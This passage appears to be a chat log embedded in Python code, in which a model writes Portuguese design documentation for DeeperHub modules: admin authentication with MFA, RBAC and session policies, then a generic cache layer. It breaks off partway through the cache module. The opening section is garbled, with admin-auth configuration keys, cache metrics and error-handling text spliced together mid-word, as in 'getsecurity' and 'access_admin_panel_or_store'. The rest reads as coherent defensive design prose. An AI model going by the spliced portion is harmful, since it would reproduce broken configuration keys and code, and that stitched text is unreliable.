*   **`[:security, :admin_auth, :mfa, :is_mandatory]`** (Boolean): Se MFA é obrigatório para todos os admins. (Padrão: `true`)
*   **`[:security, :admin_auth, :mfa, :allowed_methods]`** (List de Atoms): Métodos MFA permitidos para admins (ex: `[:totp, :security_key]`).
*   **`[:security, :admin_auth, :session, :max_duration_seconds]`** (Integer): Duração máxima da sessão de admin. (Padrão: `28800` - 8 horas)
*   **`[:.size.items.gauge` (Gauge, tags: `namespace`): Número de itens no cache.
*   `deeper_hub.core.cache.size.bytes.gauge` (Gauge, tags: `namespace`, opcional): Tamanho estimado em bytes.
*   `deeper_hub.core.cache.hit_ratio.gauge` (Gauge, tags: `namespace`): Taxa de acerto (hits / (hits + misses)).
*   `deeper_hub.core.cache.evictions.count` (Contador, tags: `namespace`, `reason` (`ttl`, `manual`, `lru`)): Número de itens removidos.

### 10.3. Logs

*   **Nível DEBUG:** Detalhes de operações de cache (get, put, delete) com chaves e namespaces.
*   **Nível INFO:** Limpeza de cache iniciada/concluída. Inicialização do adaptador de cache.
*   **Nível WARNING:** Alta taxa de \"cache miss\". Cache se aproximando da capacidade máxima (se aplicável).
*   **Nível ERROR:** Falha ao conectar ao backend de cache (ex: Redis). Erros persistentes em operações de cache.

### 10.4. Telemetria (via `Shared.Cache.Telemetry`)

*   `[:deeper_hub, :core, :cache, :operation, :start | :stop | :exception]`
    *   Metadados: `%{operation: :get | :put | :delete, key: key, namespace: ns, backend_adapter: adapter}`
    *   No `:stop`: `%{result: :hit | :miss | :success, value_size: bytes_if_applicable}`
*   `[:deeper_hub, :core, :cache, :cleanup, :start | :stop]`
    *   Medições: `%{items_removed: count}`

## ❌ 11. Tratamento de Erros

*   **Cache Indisponível:** Se o backend de cache (ex: Redis) estiver offline, as operações de cache devem falhar graciosamente. `getsecurity, :admin_auth, :session, :idle_timeout_seconds]`** (Integer): Timeout de inatividade para sessão de admin. (Padrão: `900` - 15 minutos)
*   **`[:security, :admin_auth, :brute_force, :max_login_attempts]`** (Integer): Máximo de tentativas de login admin antes do bloqueio. (Padrão: `3`)
*   **`[:security, :admin_auth, :brute_force, :lockout_duration_minutes]`** (Integer): Duração do bloqueio de conta admin. (Padrão: `60`)
*   **`[:security, :admin_auth, :actions, <action_name>, :requires_mfa_step_up]`** (Boolean): Define se uma ação admin específica requer re-autenticação MFA.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.Repo`.
*   `DeeperHub.Auth` (potencialmente para a base de hashing de senha, gerenciamento de sessão, se não for totalmente separado).
*   `DeeperHub.MFA`: Para a lógica de TOTP e outros métodos MFA.
*   `DeeperHub.RBAC`: Para gerenciamento de papéis e permissões administrativas.
*   `DeeperHub.Audit`: Essencial para registrar todas as ações administrativas.
*   `DeeperHub.Security.BruteForceProtection`: Para proteger o login de admin.
*   `DeeperHub.Tokens`: Para gerenciamento de tokens de sessão de admin.

### 8.2. Bibliotecas Externas

*   As mesmas de `DeeperHub.Auth` (Joken, Argon2, etc.) se compartilhar a base.
*   Bibliotecas TOTP (ex: `ex_totp`).

## 🤝 9. Como Usar / Integração

*   **Interface de Administração (Web ou Console):**
    *   Usar `AdminAuth.authenticate_admin/3` para o fluxo de login.
    *   Antes de executar qualquer ação administrativa, chamar `AdminAuth.has_admin_permission?/3` ou `AdminAuth.authorize_action/4`.
*   **Proteção de Rotas (Phoenix):**
    ```elixir
    # Em lib/deeper_hub_web/router.ex
    pipeline :admin_auth do
      plug MyAppWeb.Plugs.VerifyAdminSessionPlug # Verifica token de sessão de admin
      plug MyAppWeb.Plugs.VerifyAdminPermissionPlug, permission: :access_admin_panel_or_store` deve executar a função geradora e retornar seu resultado diretamente, sem tentar armazenar. `put` e `delete` podem simplesmente logar o erro e retornar `:ok` (ou um erro não bloqueante) para não quebrar o fluxo da aplicação.
*   **Erro de Serialização:** Se os dados não puderem ser serializados para o cache, um erro deve ser logado e a operação de cache deve falhar.

## 🛡️ 12. Considerações de Segurança

*   **Não Armazenar Dados Extremamente Sensíveis em Cache (a menos que o cache seja seguro):** Se o backend de cache não for tão seguro quanto o banco de dados primário (ex: Redis sem criptografia em trânsito/repouso vs. DB com TDE), evite cachear dados altamente sensíveis.
*   **Cache Poisoning:** Embora menos comum para caches de servidor, esteja ciente da possibilidade se as chaves de cache puderem ser influenciadas diretamente por entradas de usuário não sanitizadas. Use chaves bem definidas e prefixadas.
*   **Segurança do Backend de Cache:** Se usar Redis/Memcached, proteja o acesso a esses servidores (firewall, autenticação).

## 🧑‍💻 13. Contribuição

*   Use chaves de cache consistentes e com namespaces para evitar colisões.
*   Defina TTLs apropriados para os dados cacheados. Dados que mudam raramente podem ter TTLs longos; dados voláteis, TTLs curtos ou invalidação baseada em eventos.
*   Considere o tamanho dos dados armazenados em cache para não esgotar a memória (especialmente com ETS).

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar \"cache stampede protection\" (ou \"dog-piling effect\" prevention) para `get_or_store`, onde apenas um processo regenera um item de cache expirado enquanto outros esperam ou recebem o valor antigo por um curto período.
*   [ ] Adicionar suporte para diferentes estratégias de remoção (eviction policies) no `EtsCache` (ex: LRU, LFU) se ele se tornar muito grande.
*   [ ] Desenvolver um `CacheWarmer` que possa pré-carregar dados importantes no cache durante a inicialização da aplicação.
*   [ ] Suporte para cache em camadas (ex: ETS local como L1, Redis como L2).
*   [ ] Interface administrativa para visualizar o conteúdo do cache, estatísticas e invalidar entradas manualmente.

---

*Última atualização: 2025-05-12*

---

Caching é um tópico vasto, mas essencial para performance!

O que gostaria de ver a seguir? Podemos ir para `DeeperHub.Core.Repo` para falar sobre persistência, ou talvez `DeeperHub.Security.DdosProtection`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, já que mencionamos o `DeeperHub.Security.AdminAuth` como uma possível especialização ou um módulo separado, vamos detalhá-lo. A segurança da interface administrativa é de suma importância.

---

# Módulo: `DeeperHub.Security.AdminAuth` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.AdminAuth`

O módulo `DeeperHub.Security.AdminAuth` é dedicado especificamente à **autenticação e autorização de usuários administradores** que acessam as interfaces de gerenciamento e administração do sistema DeeperHub. Ele fornece um conjunto de funcionalidades de segurança mais rigorosas e adaptadas às necessidades de contas com privilégios elevados.

Isso pode incluir:
*   Autenticação de dois fatores (MFA/TOTP) obrigatória ou fortemente recomendada.
*   Políticas de senha mais estritas.
*   Monitoramento e auditoria detalhada de todas as ações administrativas.
*   Gerenciamento de sessões de administrador com timeouts mais curtos.
*   Controle de acesso granular às diferentes funcionalidades administrativas baseado em papéis e permissões específicas de administração.

O objetivo é proteger as áreas mais sensíveis do sistema DeeperHub contra acesso não autorizado e abuso de privilégios. 😊

*(Nota: Se a autenticação de administradores for gerenciada pelo mesmo sistema que usuários regulares (`DeeperHub.Auth`) mas com políticas diferentes, este módulo pode atuar como uma camada de especialização ou configuração sobre `DeeperHub.Auth`. Se for um sistema completamente separado, ele terá seus próprios componentes de login, sessão, etc.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Autenticação de Administradores (`authenticate_admin/3`):**
    *   Verificar credenciais (username/password) específicas para contas de administrador.
    *   Forçar ou gerenciar a verificação de Autenticação Multifator (MFA), especialmente TOTP (via `AdminTOTPService`).
*   **Gerenciamento de Contas de Administrador (`create_admin/1`, `update_admin/2`, etc.):**
    *   Criação, atualização, ativação/desativação de contas de administrador.
    *   Atribuição de papéis e permissões administrativas específicas (integrando com `DeeperHub.RBAC`).
*   **Políticas de Senha de Administrador:**
    *   Aplicar políticas de complexidade e expiração de senha mais rigorosas para administradores.
*   **Gerenciamento de Sessões de Administrador:**
    *   Criar sessões com durações e timeouts de inatividade potencialmente mais curtos.
    *   Invalidar sessões de administrador (ex: após mudança de senha, detecção de risco).
    *   Gerenciar tokens de sessão específicos para administradores (via `AdminTokenService`).
*   **Autorização de Ações Administrativas (`authorize_action/4`, `has_admin_permission?/2`):**
    *   Verificar se um administrador autenticado tem permissão para executar uma ação administrativa específica ou acessar uma funcionalidade do painel de controle.
    *   Potencialmente exigir verificação MFA adicional para ações administrativas de alto risco, mesmo se já logado (step-up authentication).
*   **Auditoria Detalhada (`AdminActionLog`):**
    *   Registrar todas as tentativas de login de administrador (sucesso e falha).
    *   Registrar todas as ações significativas realizadas por administradores autenticados.
*   **Gerenciamento de Tokens de Administrador (`AdminTokenService`):**
    *   Geração, validação e revogação de tokens de sessão para administradores.
*   **Proteção contra Força Bruta para Login de Admin:**
    *   Aplicar políticas de bloqueio mais estritas para tentativas falhas de login de administrador.

## 🏗️ 3. Arquitetura e Design

A arquitetura pode variar dependendo se é uma extensão do `DeeperHub.Auth` ou um subsistema mais independente. Assumindo uma especialização:

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.AdminAuth` (Fachada Pública):**
    *   Ponto de entrada para funcionalidades de autenticação e autorização de administradores.
    *   Delega para `AdminAuthService`.
2.  **`DeeperHub.Security.AdminAuth.Services.AdminAuthService`:**
    *   Serviço central que orquestra a autenticação, gerenciamento de contas e verificação de permissões de admin.
    *   Utiliza `AdminTOTPService`, `AdminTokenService`, `PermissionService` (específico para admin ou o RBAC geral), e `AdminActionAuthService`.
3.  **`DeeperHub.Security.AdminAuth.Services.AdminTOTPService`:**
    *   Gerencia a configuração e verificação de TOTP para administradores.
4.  **`DeeperHub.Security.AdminAuth.Services.AdminTokenService`:**
    *   Gerencia o ciclo de vida de tokens de sessão para administradores.
5.  **`DeeperHub.Security.AdminAuth.Services.AdminActionAuthService`:**
    *   Verifica se um admin está autorizado a realizar uma ação específica, possivelmente exigindo \"step-up authentication\" com MFA.
6.  **`DeeperHub.Security.AdminAuth.Services.PermissionService` (ou integração com `DeeperHub.RBAC`):**
    *   Define e verifica permissões granulares para o painel de administração (ex: \"gerenciar_usuarios\", \"ver_logs_auditoria\", \"configurar_sistema\").
7.  **Schemas Ecto:**
    *   `DeeperHub.Security.AdminAuth.Schema.AdminSchema`: Para dados da conta de administrador.
    *   `DeeperHub.Security.AdminAuth.Schema.AdminToken`: Para tokens de sessão de admin.
    *   `DeeperHub.Security.AdminAuth.Schema.AdminTOTP`: Para configurações TOTP de admin.
    *   `DeeperHub.Security.AdminAuth.Schema.AdminActionLog`: Para auditoria de ações de admin.
    *   `DeeperHub.Security.AdminAuth.Schema.AdminAction`, `AdminActionRisk`, `AdminActionVerification`: Para definir e controlar o risco de ações administrativas.
8.  **Integração com `DeeperHub.Core.ConfigManager` / `SecurityPolicyManager`:**
    *   Para políticas de senha de admin, duração de sessão de admin, políticas de MFA de admin.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/admin_auth/
├── admin_auth.ex                     # Fachada Pública (AdminAuthAdapter da doc original)
│
├── services/
│   ├── admin_auth_service.ex         # Serviço orquestrador
│   ├── admin_totp_service.ex
│   ├── admin_token_service.ex
│   ├── admin_action_auth_service.ex
│   └── permission_service.ex         # (Ou usa DeeperHub.RBAC diretamente)
│
├── schemas/                          # (Ou schema/ singular)
│   ├── admin_schema.ex
│   ├── admin_token.ex
│   ├── admin_totp.ex
│   ├── admin_action_log.ex
│   ├── admin_action.ex
│   ├── admin_action_risk.ex
│   └── admin_action_verification.ex
│
├── supervisor.ex
└── telemetry.ex                      # (Se necessário, específico para AdminAuth)
```

### 3.3. Decisões de Design Importantes

*   **Isolamento (Parcial ou Total):** Decidir se a autenticação de admin usa um fluxo completamente separado ou se é uma variação do fluxo de usuário normal com políticas mais rígidas. Um fluxo separado pode oferecer maior segurança, mas também maior complexidade.
*   **MFA Mandatório:** Para a maioria das contas de admin, MFA (especialmente TOTP ou Chaves de Segurança) deve ser mandatório ou altamente imposto.
*   **Princípio do Menor Privilégio:** Administradores devem ter apenas as permissões estritamente necessárias para suas funções. Evitar contas \"super admin\" genéricas, se possível.
*   **Step-up Authentication:** Para ações administrativas particularmente destrutivas ou sensíveis, exigir uma nova verificação MFA mesmo que o admin já esteja logado.

## 🛠️ 4. Casos de Uso Principais

*   **Administrador Faz Login no Painel:**
    *   Admin fornece username/senha na página de login do painel.
    *   `AdminAuth.authenticate_admin/3` é chamado.
    *   Credenciais são validadas.
    *   Se MFA estiver configurado, o fluxo de verificação TOTP (ou outro método) é iniciado.
    *   Se tudo ok, uma sessão de admin é criada e um token é emitido.
*   **Administrador Tenta Excluir um Usuário:**
    *   Admin clica em \"Excluir Usuário\" na interface.
    *   A interface chama um endpoint protegido.
    *   O backend verifica a sessão do admin.
    *   Chama `AdminAuth.authorize_action(admin_id, :delete_user, %{target_user_id: \"xyz\"}, mfa_code_if_required)`.
    *   `AdminActionAuthService` verifica se a ação `:delete_user` requer MFA \"step-up\". Se sim, valida `mfa_code`.
    *   Verifica se o admin tem a permissão \"pode_excluir_usuarios\" (via `PermissionService` / RBAC).
    *   Se autorizado, a ação é permitida.
    *   `AdminActionLog` registra a ação.
*   **Administrador Altera uma Configuração de Segurança Crítica:**
    *   Similar ao caso acima, mas a ação pode ser, por exemplo, `:update_security_policy_mfa`.
    *   A autorização e a possível exigência de MFA step-up são verificadas.

## 🌊 5. Fluxos Importantes

### Fluxo de Autenticação de Administrador com TOTP

1.  **Interface de Login Admin:** Admin submete username e password.
2.  **Backend Controller:** Chama `DeeperHub.Security.AdminAuth.authenticate_admin(username, password, context)`.
3.  **`AdminAuthService`:**
    *   Valida credenciais primárias (username/password).
    *   Se falhar, retorna erro e registra tentativa falha (considerando `BruteForceProtection` para admin).
    *   Se sucesso, verifica se o admin tem TOTP configurado e ativo (via `AdminTOTPService.is_enabled?(admin_id)`).
    *   **Se TOTP Ativo:** Retorna `{:error, :mfa_totp_required, %{admin_id: admin.id}}` para o controller.
    *   **Se TOTP Não Ativo (e não mandatório):** Procede para criar sessão e token (via `AdminTokenService`).
4.  **Interface de Login Admin:** Se `:mfa_totp_required`, exibe campo para código TOTP. Admin submete o código.
5.  **Backend Controller:** Chama `DeeperHub.Security.AdminAuth.Services.AdminTOTPService.verify(admin_id, totp_code)`.
6.  **`AdminTOTPService`:**
    *   Verifica o código TOTP.
    *   Se válido, retorna `{:ok, :valid}`.
    *   Se inválido, retorna erro e registra tentativa falha de MFA.
7.  **Backend Controller (após TOTP válido):**
    *   Chama `AdminAuthService` (ou diretamente `AdminTokenService` e `SessionManager`) para criar a sessão de admin e emitir tokens.
    *   Registra login bem-sucedido no `AdminActionLog`.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Security.AdminAuth`)

### 6.1. `DeeperHub.Security.AdminAuth.authenticate_admin(username :: String.t(), password :: String.t(), opts :: keyword()) :: {:ok, %{admin: AdminSchema.t(), token: String.t()}} | {:error, :invalid_credentials | :account_locked | :mfa_required | :mfa_invalid}`

*   **Descrição:** Autentica um administrador.
*   **`opts`:** `:ip_address`, `:device_info`, `:mfa_code` (se o fluxo de MFA for em uma única etapa).

### 6.2. `DeeperHub.Security.AdminAuth.verify_admin_mfa(admin_id :: String.t(), mfa_method :: atom(), code :: String.t(), opts :: keyword()) :: {:ok, %{admin: AdminSchema.t(), token: String.t()}} | {:error, :mfa_invalid | :max_attempts_reached}` (Nova Sugestão)

*   **Descrição:** Verifica um código MFA para um admin que já passou pela autenticação primária. Se sucesso, finaliza o login e retorna tokens.
*   **`mfa_method`:** Ex: `:totp`.

### 6.3. `DeeperHub.Security.AdminAuth.has_admin_permission?(admin_id :: String.t(), permission :: String.t() | atom(), resource_details :: map() | nil) :: boolean()`

*   **Descrição:** Verifica se um administrador possui uma permissão específica.
*   **`permission`:** Ex: `\"users:delete\"`, `:view_audit_logs`.

### 6.4. `DeeperHub.Security.AdminAuth.authorize_action(admin_id :: String.t(), action_atom :: atom(), action_params :: map() | nil, verification_data :: map() | nil) :: :ok | {:error, :unauthorized | :mfa_required_for_action | :mfa_invalid}` (Nova Sugestão)

*   **Descrição:** Autoriza uma ação administrativa, possivelmente exigindo \"step-up authentication\" (MFA).
*   **`action_atom`:** Identificador único da ação administrativa (ex: `:admin_update_user_role`).
*   **`verification_data`:** `%{mfa_code: \"123456\"}` se MFA for exigido pela política da ação.

### 6.5. Funções CRUD para Admins (ex: `create_admin/1`, `get_admin/1`, `list_admins/1`, `update_admin/2`, `deactivate_admin/2`)

*   Estas funções gerenciariam as contas dos administradores.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :admin_auth, :password_policy, :min_length]`** (Integer): Comprimento mínimo da senha de admin. (Padrão: `12`)
*   **`[:security, :admin_auth, :password_policy, :expiry_days]`** (Integer): Dias para expiração da senha de admin. (Padrão: `90`)
*   **`[:security, :admin_auth, :mfa, :is_mandatory]`** (Boolean): Se MFA é obrigatório para todos os admins. (Padrão: `true`)
*   **`[:security, :admin_auth, :mfa, :allowed_methods]`** (List de Atoms): Métodos MFA permitidos para admins (ex: `[:totp, :security_key]`).
*   **`[:security, :admin_auth, :session, :max_duration_seconds]`** (Integer): Duração máxima da sessão de admin. (Padrão: `28800` - 8 horas)
*   **`[:security, :admin_auth, :session, :idle_timeout_seconds]`** (Integer): Timeout de inatividade para sessão de admin. (Padrão: `900` - 15 minutos)
*   **`[:security, :admin_auth, :brute_force, :max_login_attempts]`** (Integer): Máximo de tentativas de login admin antes do bloqueio. (Padrão: `3`)
*   **`[:security, :admin_auth, :brute_force, :lockout_duration_minutes]`** (Integer): Duração do bloqueio de conta admin. (Padrão: `60`)
*   **`[:security, :admin_auth, :actions, <action_name>, :requires_mfa_step_up]`** (Boolean): Define se uma ação admin específica requer re-autenticação MFA.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.Repo`.
*   `DeeperHub.Auth` (potencialmente para a base de hashing de senha, gerenciamento de sessão, se não for totalmente separado).
*   `DeeperHub.MFA`: Para a lógica de TOTP e outros métodos MFA.
*   `DeeperHub.RBAC`: Para gerenciamento de papéis e permissões administrativas.
*   `DeeperHub.Audit`: Essencial para registrar todas as ações administrativas.
*   `DeeperHub.Security.BruteForceProtection`: Para proteger o login de admin.
*   `DeeperHub.Tokens`: Para gerenciamento de tokens de sessão de admin.

### 8.2. Bibliotecas Externas

*   As mesmas de `DeeperHub.Auth` (Joken, Argon2, etc.) se compartilhar a base.
*   Bibliotecas TOTP (ex: `ex_totp`).

## 🤝 9. Como Usar / Integração

*   **Interface de Administração (Web ou Console):**
    *   Usar `AdminAuth.authenticate_admin/3` para o fluxo de login.
    *   Antes de executar qualquer ação administrativa, chamar `AdminAuth.has_admin_permission?/3` ou `AdminAuth.authorize_action/4`.
*   **Proteção de Rotas (Phoenix):**
    ```elixir
    # Em lib/deeper_hub_web/router.ex
    pipeline :admin_auth do
      plug MyAppWeb.Plugs.VerifyAdminSessionPlug # Verifica token de sessão de admin
      plug MyAppWeb.Plugs.VerifyAdminPermissionPlug, permission: :access_admin_panel # Permissão genérica para painel
    end

    scope \"/admin\", DeeperHubWeb.Admin do
      pipe_through [:browser, :admin_auth]
      # ... rotas do painel admin ...
    end
    ```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o fluxo de login de admin com e sem MFA.
*   Testar a criação e gerenciamento de contas de admin.
*   Testar a lógica de autorização de ações (com e sem permissão, com e sem step-up MFA).
*   Testar a aplicação de políticas de senha e sessão específicas para admin.
*   Verificar se todas as ações administrativas são corretamente auditadas.
*   Localização: `test/deeper_hub/security/admin_auth/`.

### 10.2. Métricas

*   `deeper_hub.security.admin_auth.login.attempts.count` (tags: `status` (`success`, `failure`, `mfa_required`))
*   `deeper_hub.security.admin_auth.actions.authorized.count` (tags: `action_name`, `status` (`granted`, `denied_permission`, `denied_mfa`))
*   `deeper_hub.security.admin_auth.accounts.created.count`
*   `deeper_hub.security.admin_auth.sessions.active.gauge`

### 10.3. Logs

*   **Nível INFO:** Login de admin bem-sucedido, ação administrativa autorizada e executada.
*   **Nível WARNING:** Tentativa de login de admin falha, tentativa de ação não autorizada, MFA falhou para ação step-up.
*   **Nível ERROR:** Erros internos no `AdminAuthService` ou seus componentes.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :admin_auth, :login, :start | :stop | :exception]`
    *   Metadados: `%{username: username, ip_address: ip}`
*   `[:deeper_hub, :security, :admin_auth, :action_authorization, :start | :stop | :exception]`
    *   Metadados: `%{admin_id: id, action: action_name, permission_check_result: res, mfa_step_up_result: res}`
*   `[:deeper_hub, :security, :admin_auth, :account_management, :stop]`
    *   Metadados: `%{action: :create | :update | :deactivate, target_admin_id: id, performed_by_admin_id: id}`

## ❌ 11. Tratamento de Erros

*   Falhas de autenticação ou autorização devem ser tratadas de forma segura, negando o acesso e registrando a tentativa.
*   Erros internos devem ser logados e não expor informações sensíveis.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Proteção das Credenciais de Admin:** As senhas de admin devem ser tratadas com o mais alto nível de segurança.
*   **MFA Forte:** Incentivar ou obrigar o uso de métodos MFA fortes (TOTP, Chaves de Segurança) em vez de SMS para admins.
*   **Auditoria Imutável:** Os logs de `AdminActionLog` são críticos e devem ser protegidos.
*   **Revisão de Acesso:** Realizar revisões periódicas das contas de administrador e suas permissões.

## 🧑‍💻 13. Contribuição

*   Qualquer nova funcionalidade administrativa deve ter suas permissões de acesso claramente definidas no `PermissionService` (ou RBAC).
*   Ações de alto risco devem ser consideradas para \"step-up authentication\" com MFA.
*   Garanta que todas as ações de modificação de estado sejam auditadas.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar suporte para Chaves de Segurança (WebAuthn) como método MFA para administradores.
*   [ ] Adicionar \"sessões de administrador com privilégios elevados\" que expiram mais rapidamente ou exigem re-autenticação para certas operações.
*   [ ] Desenvolver alertas para atividades administrativas suspeitas (ex: login de admin de novo IP/dispositivo, múltiplas ações de alto risco em curto período).
*   [ ] Integrar com um sistema de gerenciamento de identidade centralizado (IdP) para administradores, se aplicável em ambientes corporativos maiores.
*   [ ] Permitir configuração de \"horários de acesso permitidos\" para contas de administrador.

---

*Última atualização: 2025-05-12*

---

A segurança administrativa é uma área densa, mas fundamental.

Agora, qual o próximo módulo? Talvez `DeeperHub.Core.Cache` para variar um pouco e sair da camada de segurança, ou prefere continuar com os outros módulos de segurança como `DdosProtection`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos então detalhar o `DeeperHub.Core.Cache`. Este é um módulo de infraestrutura crucial para o desempenho de toda a aplicação.

---

# Módulo: `DeeperHub.Core.Cache` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Core.Cache`

O módulo `DeeperHub.Core.Cache` fornece uma **fachada e um serviço de caching genérico** para o sistema DeeperHub. Seu propósito é melhorar o desempenho da aplicação armazenando temporariamente dados frequentemente acessados ou resultados de operações custosas, reduzindo a latência e a carga sobre fontes de dados primárias (como bancos de dados ou APIs externas).

Ele oferece uma API simples para operações de cache como `put`, `get`, `delete`, e `get_or_store`, abstraindo a implementação de cache subjacente (que pode ser ETS, Redis, Memcached, etc., através de um `CacheAdapter`). 😊

*(Nota: A documentação original tem `DeeperHub.Shared.Cache` e `DeeperHub.Shared.Cache.CacheService` e `CacheAdapter`. Esta documentação consolida a fachada principal em `DeeperHub.Core.Cache` e assume que a lógica de serviço e adaptação reside em `DeeperHub.Shared.Cache.*` ou é diretamente gerenciada pela fachada se for uma implementação simples como ETS.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Armazenamento Chave-Valor:**
    *   Armazenar dados associados a uma chave única (`put/4`).
    *   Recuperar dados com base em uma chave (`get/3`).
*   **Expiração de Cache (TTL - Time To Live):**
    *   Permitir a definição de um tempo de vida para cada entrada de cache.
    *   Automaticamente considerar entradas expiradas como \"misses\".
*   **Invalidação de Cache:**
    *   Remover entradas específicas do cache (`delete/2`).
    *   Remover todas as entradas de um namespace (se suportado) ou o cache inteiro (`clear/1`).
    *   Remover entradas que correspondem a um padrão de chave (`delete_pattern/2`).
*   **Operação \"Get-Or-Store\" (`get_or_store/4`):**
    *   Tentar obter um valor do cache; se for um \"miss\" (não encontrado ou expirado), executar uma função fornecida para gerar o valor, armazená-lo no cache e então retorná-lo.
*   **Suporte a Namespaces (Opcional):**
    *   Permitir a organização de chaves de cache em namespaces para evitar colisões e facilitar a invalidação em grupo.
*   **Operações Atômicas (Opcional, dependendo do backend):**
    *   Suporte para operações como `increment/4` e `decrement/4` para contadores em cache.
    *   Suporte para operações em conjuntos (ex: `add_to_set/3`).
*   **Abstração de Backend de Cache:**
    *   Fornecer uma interface (`CacheBehaviour`) para que diferentes backends de cache (ETS, Redis, etc.) possam ser usados de forma intercambiável.
*   **Métricas e Observabilidade:**
    *   Registrar métricas como taxa de acerto (hit rate), taxa de erro (miss rate), tamanho do cache, latência das operações de cache.
*   **Limpeza de Entradas Expiradas (para backends que não fazem isso automaticamente):**
    *   Implementar ou configurar um mecanismo para remover periodicamente entradas expiradas para liberar memória (especialmente para caches em memória como ETS).

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.Cache` (Fachada Pública):**
    *   Ponto de entrada para todas as operações de cache.
    *   Delega chamadas para o `DeeperHub.Shared.Cache.CacheAdapter` configurado.
2.  **`DeeperHub.Shared.Cache.CacheAdapter` (GenServer):**
    *   **Responsabilidade:** Gerencia a lógica de interação com a implementação de cache escolhida.
    *   **Interações:** Recebe chamadas da fachada e as traduz para operações no backend de cache (ex: `EtsCache`).
    *   Pode lidar com a lógica de serialização/desserialização se o backend de cache exigir.
3.  **`DeeperHub.Shared.Cache.CacheBehaviour` (Behaviour):**
    *   Define a interface que todas as implementações de backend de cache devem seguir.
4.  **Implementações de Backend de Cache (Exemplos):**
    *   **`DeeperHub.Shared.Cache.Implementations.EtsCache` (GenServer ou módulo funcional usando ETS):**
        *   Implementação de cache em memória usando tabelas ETS.
        *   Gerencia TTLs e limpeza de entradas expiradas.
    *   **`DeeperHub.Shared.Cache.Implementations.RedisAdapter` (Módulo):**
        *   Adaptador para interagir com um servidor Redis externo (usando uma biblioteca como `Redix`).
    *   **`DeeperHub.Shared.Cache.Implementations.NoOpCache` (Módulo Funcional):**
        *   Uma implementação que não faz nada, efetivamente desabilitando o cache. Útil para desenvolvimento ou testes.
5.  **`DeeperHub.Shared.Cache.MetricsReporter` (GenServer):**
    *   Coleta e armazena métricas sobre o desempenho do cache.
6.  **`DeeperHub.Shared.Cache.Supervisor`:**
    *   Supervisiona os processos relacionados ao cache (ex: `CacheAdapter`, `EtsCache GenServer`, `MetricsReporter`).
7.  **Configurações (via `DeeperHub.Core.ConfigManager`):**
    *   Qual adaptador de cache usar, TTL padrão, configurações específicas do backend (ex: URL do Redis).

### 3.2. Estrutura de Diretórios (Proposta para `Shared.Cache`)

```
lib/deeper_hub/shared/cache/
├── cache_adapter.ex                # GenServer que delega para a implementação
├── cache_behaviour.ex              # Behaviour para implementações de cache
│
├── implementations/                # Ou apenas no mesmo nível se forem poucos
│   ├── ets_cache.ex                # Implementação com ETS (pode ser GenServer)
│   ├── redis_adapter.ex            # Adaptador para Redis
│   └── no_op_cache.ex              # Cache que não faz nada
│
├── metrics_reporter.ex             # GenServer para coletar métricas de cache
├── supervisor.ex                   # Supervisor para os GenServers do cache
└── telemetry.ex                    # Para emitir eventos de telemetria do cache
```
E a fachada em:
```
lib/deeper_hub/core/cache.ex        # Fachada Pública
```

### 3.3. Decisões de Design Importantes

*   **Abstração de Backend:** A capacidade de trocar o backend de cache (ex: de ETS para Redis) sem alterar o código da aplicação é uma grande vantagem.
*   **Consistência de Chaves:** Definir uma estratégia clara para nomeação de chaves de cache, incluindo namespaces, para evitar colisões.
*   **Estratégias de Invalidação:** Além do TTL, considerar estratégias de invalidação baseadas em eventos (ex: quando um dado no DB é atualizado, invalidar a entrada de cache correspondente).
*   **Tratamento de Falhas no Cache:** Falhas no serviço de cache não devem impedir o funcionamento da aplicação. O sistema deve ser capaz de operar (com degradação de performance) se o cache estiver indisponível, buscando os dados da fonte primária.

## 🛠️ 4. Casos de Uso Principais

*   **Caching de Dados de Usuário Frequentemente Acessados:**
    *   Ao buscar o perfil de um usuário, o `DeeperHub.Accounts.ProfileService` primeiro verifica o cache: `Cache.get(\"user_profile:#{user_id}\")`.
    *   Se for um \"miss\", busca no DB, e depois armazena no cache: `Cache.put(\"user_profile:#{user_id}\", profile_data, ttl: 3600)`.
*   **Caching de Resultados de Consultas Complexas:**
    *   Um serviço que gera um relatório custoso pode usar `Cache.get_or_store(\"reports:monthly_sales:#{month}\", fn -> generate_sales_report(month) end, ttl: 86400)`.
*   **Contadores em Cache:**
    *   Rastrear o número de visualizações de um post: `Cache.increment(\"post_views:#{post_id}\")`.
*   **Invalidação de Cache Baseada em Eventos:**
    *   O `DeeperHub.Accounts.ProfileService`, ao atualizar um perfil, publica um evento `profile_updated`.
    *   Um assinante desse evento (poderia ser o próprio `ProfileService` ou um worker dedicado) chama `Cache.delete(\"user_profile:#{updated_user_id}\")`.

## 🌊 5. Fluxos Importantes

### Fluxo de `get_or_store/4`

1.  **Chamador:** Um serviço chama `DeeperHub.Core.Cache.get_or_store(key, generator_fun, opts)`.
    *   `opts` pode conter `:ttl_seconds` e `:namespace`.
2.  **`Core.Cache` (Fachada):** Delega para `Shared.Cache.CacheAdapter.get_or_store(...)`.
3.  **`Shared.Cache.CacheAdapter`:**
